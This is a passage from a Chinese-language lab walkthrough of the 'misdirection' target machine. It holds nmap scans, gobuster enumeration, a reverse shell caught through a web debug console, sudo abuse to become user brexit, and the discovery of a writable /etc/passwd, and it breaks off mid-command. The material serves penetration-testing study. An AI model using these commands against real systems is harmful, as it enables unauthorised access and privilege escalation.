class="hljs-string">(Ubuntu)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-attr">Apache2 Ubuntu Default Page:</span> <span class="hljs-string">It</span> <span class="hljs-string">works</span><br><span class="hljs-string">|_http-open-proxy:</span> <span class="hljs-string">Proxy</span> <span class="hljs-string">might</span> <span class="hljs-string">be</span> <span class="hljs-string">redirecting</span> <span class="hljs-string">requests</span><br><span class="hljs-attr">MAC Address:</span> <span class="hljs-number">00</span><span class="hljs-string">:0C:29:20:A6:AD</span> <span class="hljs-string">(VMware)</span><br><span class="hljs-attr">Warning:</span> <span class="hljs-string">OSScan</span> <span class="hljs-string">results</span> <span class="hljs-string">may</span> <span class="hljs-string">be</span> <span class="hljs-string">unreliable</span> <span class="hljs-string">because</span> <span class="hljs-string">we</span> <span class="hljs-string">could</span> <span class="hljs-string">not</span> <span class="hljs-string">find</span> <span class="hljs-string">at</span> <span class="hljs-string">least</span> <span class="hljs-number">1</span> <span class="hljs-string">open</span> <span class="hljs-string">and</span> <span class="hljs-number">1</span> <span class="hljs-string">closed</span> <span class="hljs-string">port</span><br><span class="hljs-attr">Device type:</span> <span class="hljs-string">general</span> <span class="hljs-string">purpose</span><br><span class="hljs-attr">Running:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">4.</span><span class="hljs-string">X|5.X</span><br><span class="hljs-attr">OS CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel:4</span> <span class="hljs-string">cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-attr">OS details:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">4.15</span> <span class="hljs-bullet">-</span> <span class="hljs-number">5.8</span><br><span class="hljs-attr">Network Distance:</span> <span class="hljs-number">1</span> <span class="hljs-string">hop</span><br><span class="hljs-attr">Service Info: OS:</span> <span class="hljs-string">Linux;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel</span><br><br><span class="hljs-string">OS</span> <span class="hljs-string">and</span> <span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-attr">Nmap done:</span> <span class="hljs-number">1</span> <span class="hljs-string">IP</span> <span class="hljs-string">address</span> <span class="hljs-string">(1</span> <span class="hljs-string">host</span> <span class="hljs-string">up)</span> <span class="hljs-string">scanned</span> <span class="hljs-string">in</span> <span class="hljs-number">15.32</span> <span class="hljs-string">seconds</span><br></code></pre></td></tr></table></figure><p>Linux 操作系统，80 端口使用 python 搭建了个 Rocket 服务，8080 端口是默认的 Apache 界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.139<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-21 22:40 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00025s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    open|filtered domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   open|filtered ntp<br>135/udp   open|filtered msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   open|filtered netbios-dgm<br>139/udp   open|filtered netbios-ssn<br>161/udp   open|filtered snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:20:A6:AD (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.52 seconds<br></code></pre></td></tr></table></figure><p>UDP 扫描结果并没有特别有价值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.1.1.139                       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-21 22:38 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00024s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.1.1.139:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/login?_next=%2Finit%2Fdefault%2Felections%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/login?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/register?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|     http://192.1.1.139:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|_    http://192.1.1.139:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /admin/: Possible admin folder</span><br><span class="hljs-string">|   /admin/admin/: Possible admin folder</span><br><span class="hljs-string">|   /admin/backup/: Possible backup</span><br><span class="hljs-string">|   /admin/download/backup.sql: Possible database backup</span><br><span class="hljs-string">|   /examples/: Sample scripts</span><br><span class="hljs-string">|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS</span><br><span class="hljs-string">|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload</span><br><span class="hljs-string">|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload</span><br><span class="hljs-string">|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload</span><br><span class="hljs-string">|   /admin/jscript/upload.php: Lizard Cart/Remote File upload</span><br><span class="hljs-string">|   /admin/jscript/upload.html: Lizard Cart/Remote File upload</span><br><span class="hljs-string">|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload</span><br><span class="hljs-string">|_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.1.1.139<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.1.1.139:80/init/default/user/login?_next=/init/default/index<br>|     Form <span class="hljs-built_in">id</span>: auth_user_email__row<br>|     Form action: <span class="hljs-comment">#</span><br>|     <br>|     Path: http://192.1.1.139:80/init/default/elections<br>|     Form <span class="hljs-built_in">id</span>: auth_user_email__row<br>|     Form action: <span class="hljs-comment">#</span><br>|     <br>|     Path: http://192.1.1.139:80/init/default/user/request_reset_password?_next=/init/default/index<br>|     Form <span class="hljs-built_in">id</span>: auth_user_email__row<br>|_    Form action: <span class="hljs-comment">#</span><br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>| http-enum: <br>|   /wordpress/: Blog<br>|   /wordpress/wp-login.php: Wordpress login page.<br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|   /debug/: Potentially interesting folder<br>|   /development/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|   /help/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|   /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|   /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|   /manual/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|_  /scripts/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>MAC Address: 00:0C:29:20:A6:AD (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1098.22 seconds<br><br></code></pre></td></tr></table></figure><p>漏洞扫描的结果比较长，先进入了 Web 界面查看环节</p><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>80 端口似乎是一个在线投票平台，有登录界面</p><p><img src="/pic/28d1c60037bc8065c400b3faf1ab4cd6_MD5.png"></p><p>登录界面给出了搭建网站所使用的框架</p><p><img src="/pic/c5f753bbf633f075dde7cbc1c0388970_MD5.png"></p><p>尝试搜索 <code>web2py</code></p><p><img src="/pic/ca24f018692e59800d4ce8fa6595e6c4_MD5.png"></p><p>的确发现了一个漏洞列表，提到了其中包含本地文件包含、XSS 和 CSRF。仔细看发现需要知道使用的组件名称 <code>[applicationmame]</code>，这就遇到了困难了，接着看看别的攻击面吧。</p><h2 id="渗透优先级"><a href="#渗透优先级" class="headerlink" title="渗透优先级"></a>渗透优先级</h2><p>这时候，根据 vuln 脚本的扫描结果，发现 8080 端口下有很多目录，试一试目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.139:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.139:8080/<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/22 10:33:46 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images   (Status: 301) [Size: 318] [--&gt; http://192.1.1.139:8080/images/]                                                   <br>/scripts  (Status: 301) [Size: 319] [--&gt; http://192.1.1.139:8080/scripts/]                                                  <br>/css      (Status: 301) [Size: 315] [--&gt; http://192.1.1.139:8080/css/]     <br><br>/wordpress (Status: 301) [Size: 321] [--&gt; http://192.1.1.139:8080/wordpress/]                                                <br>/development          (Status: 301) [Size: 323] [--&gt; http://192.1.1.139:8080/development/]                                              <br>/manual               (Status: 301) [Size: 318] [--&gt; http://192.1.1.139:8080/manual/]                                                   <br>/js                   (Status: 301) [Size: 314] [--&gt; http://192.1.1.139:8080/js/]                                                       <br>/shell                (Status: 301) [Size: 317] [--&gt; http://192.1.1.139:8080/shell/]                                                    <br>/debug                (Status: 301) [Size: 317] [--&gt; http://192.1.1.139:8080/debug/]                                                    <br>/help                 (Status: 301) [Size: 316] [--&gt; http://192.1.1.139:8080/help/]                                                     <br>/server-status        (Status: 403) [Size: 278]<br>Progress: 218960 / 220561 (99.27%)<br>===============================================================<br>2023/06/22 10:34:06 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>依次查看上述目录，发现 debug 是最直接的攻击面，而 wordpress 一开始被我放在了首位，尝试了很多方法都没有拿到 shell。这台靶机对我来说最大的意义在于一定要时刻权衡攻击路径的优先级。优先级的选取上，要么选取试错成本小的，要么选择熟悉的攻击面，并且要对总体攻击面有一定的了解。</p><h3 id="debug-目录"><a href="#debug-目录" class="headerlink" title="debug 目录"></a>debug 目录</h3><p><img src="/pic/160d1b1620ed83417c43886b91e7ec8b_MD5.png"></p><p>是一个可以直接交互的 shell，分别尝试 bash 和 python 反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443                                                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.139] 53380<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@misdirection:/tmp$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="提权到brexit"><a href="#提权到brexit" class="headerlink" title="提权到brexit"></a>提权到brexit</h3><p>基础的信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@misdirection:/tmp$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on localhost:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User www-data may run the following commands on localhost:<br>    (brexit) NOPASSWD: /bin/bash<br>www-data@misdirection:/tmp$ sudo -u brexit /bin/bash<br>sudo -u brexit /bin/bash<br>brexit@misdirection:/tmp$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>brexit<br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 有意外惊喜，<code>sudo -u</code> 的语法是现查的，感谢 chatgpt，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:/tmp$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(brexit) gid=1000(brexit) <span class="hljs-built_in">groups</span>=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)<br>brexit@misdirection:/tmp$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> brexit: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> brexit: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> brexit: <br><br>sudo: 3 incorrect password attempts<br>brexit@misdirection:/tmp$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>brexit@misdirection:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>start-vote.sh  user.txt  web2py<br>brexit@misdirection:~$ <span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">pwd</span><br>/home/brexit<br>brexit@misdirection:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>404b9193154be7fbbc56d7534cb26339<br></code></pre></td></tr></table></figure><h3 id="viminfo-敏感文件"><a href="#viminfo-敏感文件" class="headerlink" title="viminfo 敏感文件"></a>viminfo 敏感文件</h3><p>看看家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:~$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 60K<br>402287 drwxr-xr-x  6 brexit brexit 4.0K Jun  1  2019 .<br>393218 drwxr-xr-x  3 root   root   4.0K Jun  1  2019 ..<br>403447 -rw-------  1 brexit brexit    0 Jun  1  2019 .bash_history<br>402289 -rw-r--r--  1 brexit brexit  220 Apr  4  2018 .bash_logout<br>402290 -rw-r--r--  1 brexit brexit 3.7K Apr  4  2018 .bashrc<br>402295 drwx------  3 brexit brexit 4.0K Jun  1  2019 .cache<br>402297 drwx------  3 brexit brexit 4.0K Jun  1  2019 .gnupg<br>402259 drwxrwxr-x  3 brexit brexit 4.0K Jun  1  2019 .<span class="hljs-built_in">local</span><br>402288 -rw-r--r--  1 brexit brexit  807 Apr  4  2018 .profile<br>402215 -rw-rw-r--  1 brexit brexit   66 Jun  1  2019 .selected_editor<br>393356 -rw-------  1 brexit brexit 9.2K Jun  1  2019 .viminfo<br>402285 -rwxrwxr-x  1 brexit brexit   90 Jun  1  2019 start-vote.sh<br>393358 -r--r-----  1 brexit brexit   33 Jun  1  2019 user.txt<br>402661 drwxrwxr-x 16 brexit brexit 4.0K Jun 20 12:45 web2py<br><br></code></pre></td></tr></table></figure><p>家目录下有个敏感文件 <code>viminfo</code>。一开始我忽略了这个文件，导致后续提权操作很艰难而且没有成功。我尝试了使用 pkexec 提权和查找敏感的密码文件，虽然成功登录了 mysql，但那个密码也仅局限于登录 mysql，数据库中读取到的包含用户的密码是经过 md5 加密的。在线的破解没有效果。这次也是对自己的一个提醒，要了解常见的提权手法，红队笔记的提权视频要纳入日程当中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:~$ <span class="hljs-built_in">cat</span> .viminfo<br><span class="hljs-built_in">cat</span> .viminfo<br><span class="hljs-comment"># This viminfo file was generated by Vim 8.0.</span><br><span class="hljs-comment"># You may edit it if you&#x27;re careful!</span><br><br><span class="hljs-comment"># Viminfo version</span><br>|1,4<br><br><span class="hljs-comment"># Value of &#x27;encoding&#x27; when this file was written</span><br>*encoding=latin1<br><br><br><span class="hljs-comment"># hlsearch on (H) or off (h):</span><br>~h<br><span class="hljs-comment"># Last Search Pattern:</span><br>~MSle0~/any<br><br><span class="hljs-comment"># Command Line History (newest to oldest):</span><br>:q!<br>|2,0,1559373596,,<span class="hljs-string">&quot;q!&quot;</span><br>:<span class="hljs-built_in">set</span> <span class="hljs-built_in">paste</span><br>|2,0,1559353917,,<span class="hljs-string">&quot;set paste&quot;</span><br><br><span class="hljs-comment"># Search String History (newest to oldest):</span><br>?/any<br>|2,1,1559354744,47,<span class="hljs-string">&quot;any&quot;</span><br>?/anyserver<br>|2,1,1559354723,47,<span class="hljs-string">&quot;anyserver&quot;</span><br>?/port<br>|2,1,1559354713,47,<span class="hljs-string">&quot;port&quot;</span><br>?/127<br>|2,1,1559354712,47,<span class="hljs-string">&quot;127&quot;</span><br><br><span class="hljs-comment"># Expression History (newest to oldest):</span><br><br><span class="hljs-comment"># Input Line History (newest to oldest):</span><br><br><span class="hljs-comment"># Debug Line History (newest to oldest):</span><br><br><span class="hljs-comment"># Registers:</span><br><br><span class="hljs-comment"># File marks:</span><br><span class="hljs-string">&#x27;0  1  0  /etc/passwd</span><br><span class="hljs-string">|4,48,1,0,1559373596,&quot;/etc/passwd&quot;</span><br><span class="hljs-string">&#x27;</span>1  1  0  ~/web2py/parameters_8000.py<br>|4,49,1,0,1559355323,<span class="hljs-string">&quot;~/web2py/parameters_8000.py&quot;</span><br><span class="hljs-string">&#x27;2  1  0  ~/web2py/parameters_8000.py</span><br><span class="hljs-string">|4,50,1,0,1559355267,&quot;~/web2py/parameters_8000.py&quot;</span><br><span class="hljs-string">&#x27;</span>3  318  9  ~/web2py/anyserver.py<br>|4,51,318,9,1559354953,<span class="hljs-string">&quot;~/web2py/anyserver.py&quot;</span><br></code></pre></td></tr></table></figure><p>viminfo 文件中暴露了一个非常重要的事情，似乎这个用户对 passwd 有过操作，接下来查看一下 passwd 文件的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:~$ <span class="hljs-built_in">ls</span> -liah /etc/passwd<br><span class="hljs-built_in">ls</span> -liah /etc/passwd<br>153253 -rwxrwxr-- 1 root brexit 1.6K Jun  1  2019 /etc/passwd<br>brexit@misdirection:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>brexit:x:1000:1000:brexit:/home/brexit:/bin/bash<br>mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false<br><br></code></pre></td></tr></table></figure><h3 id="passwd-文件写入"><a href="#passwd-文件写入" class="headerlink" title="passwd 文件写入"></a>passwd 文件写入</h3><p>原来这个用户可以操作 passwd 文件，那就搜一下如何向 passwd 文件中添加用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 